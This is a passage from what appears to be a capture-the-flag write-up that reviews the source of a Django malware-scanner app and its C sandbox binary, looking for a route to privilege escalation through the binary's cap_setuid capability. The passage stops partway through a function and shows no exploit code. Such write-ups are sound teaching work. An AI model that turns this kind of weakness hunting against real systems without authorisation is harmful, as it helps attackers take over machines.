<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">urls</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="nb">__pycache__</span><span class="o">/</span><span class="n">views</span><span class="mf">.</span><span class="n">cpython</span><span class="o">-</span><span class="mf">39.</span><span class="n">pyc</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="n">admin</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="n">apps</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="n">syscalls</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="n">tests</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="n">urls</span><span class="mf">.</span><span class="n">py</span>
<span class="n">malscanner</span><span class="o">/</span><span class="n">viewer</span><span class="o">/</span><span class="n">views</span><span class="mf">.</span><span class="n">py</span>
<span class="n">sandbox</span><span class="o">/</span>
<span class="n">sandbox</span><span class="o">/.</span><span class="n">gitignore</span>
<span class="n">sandbox</span><span class="o">/</span><span class="nc">Makefile</span>
<span class="n">sandbox</span><span class="o">/</span><span class="n">copy</span><span class="mf">.</span><span class="n">c</span>
<span class="n">sandbox</span><span class="o">/</span><span class="n">jails</span><span class="o">/</span>
<span class="n">sandbox</span><span class="o">/</span><span class="n">sandbox</span><span class="mf">.</span><span class="n">c</span>
<span class="n">sandbox</span><span class="o">/</span><span class="n">tracing</span><span class="mf">.</span><span class="n">c</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Looking at the source code of the upload form we see what happens with our uploaded binary.  First it generates a md5 hash of our uploaded file writes it to disk and runs it with a  <code class="language-plaintext highlighter-rouge">sandbox</code> executable.</p>

<p><code class="language-plaintext highlighter-rouge">malscanner/scanner/views.py</code></p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span><span class="p">,</span> <span class="n">HttpResponseRedirect</span>
<span class="kn">from</span> <span class="n">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
<span class="kn">from</span> <span class="n">django.conf</span> <span class="kn">import</span> <span class="n">settings</span>
<span class="kn">from</span> <span class="n">django_file_md5</span> <span class="kn">import</span> <span class="n">calculate_file_md5</span>

<span class="kn">from</span> <span class="n">.forms</span> <span class="kn">import</span> <span class="n">UploadFileForm</span>

<span class="kn">import</span> <span class="n">os</span>


<span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
    <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="s">"Hello, world. You're at the polls index."</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
        <span class="n">form</span> <span class="o">=</span> <span class="nc">UploadFileForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">POST</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">FILES</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">form</span><span class="p">.</span><span class="nf">is_valid</span><span class="p">():</span>
            <span class="n">md5</span> <span class="o">=</span> <span class="nf">handle_file</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">FILES</span><span class="p">[</span><span class="s">'file'</span><span class="p">])</span>
            <span class="k">return</span> <span class="nc">HttpResponseRedirect</span><span class="p">(</span><span class="sa">f</span><span class="s">'/viewer/</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="s">"Invalid form"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="s">'upload.html'</span><span class="p">,</span> <span class="p">{</span><span class="s">'form'</span><span class="p">:</span> <span class="nc">UploadFileForm</span><span class="p">()})</span>


<span class="k">def</span> <span class="nf">handle_file</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
    <span class="n">md5</span> <span class="o">=</span> <span class="nf">calculate_file_md5</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">settings</span><span class="p">.</span><span class="n">FILE_PATH</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">"</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">'wb+'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="nf">chunks</span><span class="p">():</span>
            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="s">"cd </span><span class="si">{</span><span class="n">settings</span><span class="p">.</span><span class="n">SBX_PATH</span><span class="si">}</span><span class="s">; ./sandbox </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">md5</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The viewer seems to return some syscalls that happened during execution.</p>

<p><code class="language-plaintext highlighter-rouge">malscanner/viewer/views.py</code></p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
<span class="kn">from</span> <span class="n">django.conf</span> <span class="kn">import</span> <span class="n">settings</span>
<span class="kn">from</span> <span class="n">django.http</span> <span class="kn">import</span> <span class="n">Http404</span><span class="p">,</span> <span class="n">HttpResponse</span>
<span class="kn">from</span> <span class="n">.syscalls</span> <span class="kn">import</span> <span class="n">LoggedSyscall</span><span class="p">,</span> <span class="n">SyscallClass</span>

<span class="kn">import</span> <span class="n">os.path</span>
<span class="kn">import</span> <span class="n">struct</span>


<span class="k">def</span> <span class="nf">view_file</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">md5</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">settings</span><span class="p">.</span><span class="n">SBX_PATH</span><span class="si">}</span><span class="s">/jails/</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">"</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
        <span class="k">raise</span> <span class="nc">Http404</span><span class="p">(</span><span class="s">"A sample with this hash has not been uploaded."</span><span class="p">)</span>
    <span class="n">logfile</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s">/log"</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">logfile</span><span class="p">):</span>
        <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="s">"There was an error logging this application"</span><span class="p">)</span>
    <span class="n">syscalls</span> <span class="o">=</span> <span class="p">[</span><span class="n">call</span><span class="p">.</span><span class="nf">render</span><span class="p">()</span> <span class="k">for</span> <span class="n">call</span> <span class="ow">in</span> <span class="nf">parse_log</span><span class="p">(</span><span class="n">logfile</span><span class="p">)]</span>
    <span class="n">ignore</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Ignore</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
    <span class="n">low</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Low</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
    <span class="n">med</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
    <span class="n">high</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
    <span class="n">render_vars</span> <span class="o">=</span> <span class="p">{</span><span class="s">"md5"</span><span class="p">:</span> <span class="n">md5</span><span class="p">,</span> <span class="s">"ignore"</span><span class="p">:</span> <span class="n">ignore</span><span class="p">,</span> <span class="s">"low"</span><span class="p">:</span> <span class="n">low</span><span class="p">,</span> <span class="s">"med"</span><span class="p">:</span> <span class="n">med</span><span class="p">,</span> <span class="s">"high"</span><span class="p">:</span> <span class="n">high</span><span class="p">}</span>
    <span class="k">return</span> <span class="nf">render</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="s">'view.html'</span><span class="p">,</span> <span class="n">render_vars</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">parse_log</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">syscalls</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
        <span class="n">nums</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s">"q"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">chunk</span><span class="p">)</span>
        <span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span><span class="o">*</span><span class="mi">8</span><span class="p">:</span>
            <span class="n">nums</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s">"q"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">chunk</span><span class="p">)</span>
            <span class="n">call</span> <span class="o">=</span> <span class="nc">LoggedSyscall</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span>
            <span class="n">syscalls</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">call</span><span class="p">)</span>
            <span class="n">chunk</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">syscalls</span>
</pre></td></tr></tbody></table></code></div></div>
<p><code class="language-plaintext highlighter-rouge">malscanner/viewer/syscalls.py</code></p>

<p>In the <code class="language-plaintext highlighter-rouge">source.tar.gz</code> the code for <code class="language-plaintext highlighter-rouge">sandbox</code> is also included.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>find .
.
./.gitignore
./Makefile
./tracing.c
./sandbox.c
./jails
./copy.c
</pre></td></tr></tbody></table></code></div></div>

<p>Looking at the <code class="language-plaintext highlighter-rouge">Makefile</code> we see it creates the <code class="language-plaintext highlighter-rouge">jails</code> directory upon building. Furthermore the finished binary getâ€™s the <code class="language-plaintext highlighter-rouge">cap_setuid</code> capability set which looks very promising in a successful exploit scenario.</p>

<p><code class="language-plaintext highlighter-rouge">Makefile</code></p>

<pre><code class="language-Makefile">.PHONY: all clean

all: sandbox

jails:
	mkdir jails; chmod 0771 jails


sandbox: jails sandbox.c copy.c tracing.c
	gcc sandbox.c copy.c tracing.c -static -o sandbox
	sudo setcap 'cap_setpcap,cap_sys_admin,cap_setuid,cap_setgid,cap_sys_chroot=+eip' ./sandbox

clean:
	for i in $(shell find jails -maxdepth 2 -name proc); do sudo umount $$i; done
	rm -rf sandbox jails/*
</code></pre>

<p>Going through the source code we start in the main function of the program. The binary expects at least one argument else it exits and the argument has to start with <code class="language-plaintext highlighter-rouge">/</code>.  The flow continues by calling the <code class="language-plaintext highlighter-rouge">check_cap()</code> function.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/main</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: %s &lt;program&gt; [uuid]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&gt;</span> <span class="n">FILENAME_MAX</span> <span class="o">-</span> <span class="mi">50</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span><span class="s">"Program name too long"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span> <span class="o">!=</span> <span class="sc">'/'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span><span class="s">"Program path must be absolute"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">check_caps</span><span class="p">();</span>
    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">mkdir</span><span class="p">(</span><span class="s">"jails"</span><span class="p">,</span> <span class="mo">0771</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">errno</span> <span class="o">!=</span> <span class="n">EEXIST</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span> <span class="s">"Could not create jail directory"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="kt">char</span> <span class="n">uuid</span><span class="p">[</span><span class="mi">33</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">generate_uuid</span><span class="p">(</span><span class="n">uuid</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="n">uuid</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">32</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">uuid</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">make_jail</span><span class="p">(</span><span class="n">uuid</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Inside the function the current capabilities of the process are retrieved and if they arenâ€™t sufficient to pass the check the program exits. Since we cannot change the capabilities on the remote binary unless we have root access this check is irrelevant for us unless building the binary ourselves.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/check_caps</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">user_cap_header_struct</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">version</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
<span class="p">};</span>
<span class="k">struct</span> <span class="n">user_cap_data_struct</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">effective</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">permitted</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">inheritable</span><span class="p">;</span>
<span class="p">};</span>


<span class="kt">int</span> <span class="nf">copy</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">);</span>
<span class="kt">void</span> <span class="nf">do_trace</span><span class="p">();</span>
<span class="kt">int</span> <span class="n">jailsfd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="cp">#define DIE(err) fprintf(stderr, err ": (%d)\n", errno); exit(-1)
</span>
<span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>

<span class="c1">// Check we have all required capabilities</span>
<span class="kt">void</span> <span class="nf">check_caps</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="n">user_cap_header_struct</span> <span class="n">header</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">user_cap_data_struct</span> <span class="n">caps</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">pad</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="n">header</span><span class="p">.</span><span class="n">version</span> <span class="o">=</span> <span class="n">_LINUX_CAPABILITY_VERSION_3</span><span class="p">;</span>
    <span class="n">header</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">caps</span><span class="p">.</span><span class="n">effective</span> <span class="o">=</span> <span class="n">caps</span><span class="p">.</span><span class="n">inheritable</span> <span class="o">=</span> <span class="n">caps</span><span class="p">.</span><span class="n">permitted</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_capget</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">caps</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">caps</span><span class="p">.</span><span class="n">effective</span> <span class="o">&amp;</span> <span class="mh">0x2401c0</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span><span class="s">"Insufficient capabilities"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Next up in main a uuid is generated if no second argument is passed which would in turn take the place of the uuid.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/generate_uuid</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">generate_uuid</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">buf</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">"%02hhx"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mi">255</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Before the program ends the <code class="language-plaintext highlighter-rouge">make_jail</code> function is called in main. First it checks if a file with the name of the uuid already exists in the <code class="language-plaintext highlighter-rouge">jails</code> directory, exits if it does and elses create a directory with the uuid as name. Afterwards it switches to the dirctory and calls <code class="language-plaintext highlighter-rouge">copy_libs</code>.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/make_jail</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">make_jail</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">program</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">jailsfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"jails"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="o">|</span><span class="n">__O_DIRECTORY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">faccessat</span><span class="p">(</span><span class="n">jailsfd</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">F_OK</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span><span class="s">"Jail name exists"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">mkdirat</span><span class="p">(</span><span class="n">jailsfd</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="mo">0771</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">errno</span> <span class="o">!=</span> <span class="n">EEXIST</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span> <span class="s">"Could not create the jail"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="n">F_OK</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span><span class="s">"Program does not exist"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">chdir</span><span class="p">(</span><span class="s">"jails"</span><span class="p">);</span>
    <span class="n">chdir</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
    <span class="n">copy_libs</span><span class="p">();</span>
    <span class="n">do_namespaces</span><span class="p">();</span>
    <span class="n">copy</span><span class="p">(</span><span class="n">program</span><span class="p">,</span> <span class="s">"./userprog"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">chroot</span><span class="p">(</span><span class="s">"."</span><span class="p">))</span> <span class="p">{</span><span class="n">DIE</span><span class="p">(</span><span class="s">"Couldn't chroot #1"</span><span class="p">);}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">setgid</span><span class="p">(</span><span class="mi">1001</span><span class="p">))</span> <span class="p">{</span><span class="n">DIE</span><span class="p">(</span><span class="s">"SGID"</span><span class="p">);}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">setegid</span><span class="p">(</span><span class="mi">1001</span><span class="p">))</span> <span class="p">{</span><span class="n">DIE</span><span class="p">(</span><span class="s">"SEGID"</span><span class="p">);}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="mi">1001</span><span class="p">))</span> <span class="p">{</span><span class="n">DIE</span><span class="p">(</span><span class="s">"SUID"</span><span class="p">);};</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">seteuid</span><span class="p">(</span><span class="mi">1001</span><span class="p">))</span> <span class="p">{</span><span class="n">DIE</span><span class="p">(</span><span class="s">"SEUID"</span><span class="p">);};</span>
    <span class="n">do_trace</span><span class="p">();</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Here a <code class="language-plaintext highlighter-rouge">bin</code> , <code class="language-plaintext highlighter-rouge">usr/lib/x86_64-linux-gnu</code> and  <code class="language-plaintext highlighter-rouge">usr/lib64</code> directory get created. Next <code class="language-plaintext highlighter-rouge">copy</code> gets called to copy the the library and afterwards two symlinks are created for <code class="language-plaintext highlighter-rouge">lib64</code> and <code class="language-plaintext highlighter-rouge">lib</code> respectively.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/copy_libs</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">copy_libs</span><span class="p">()</span> <span class="p">{</span>
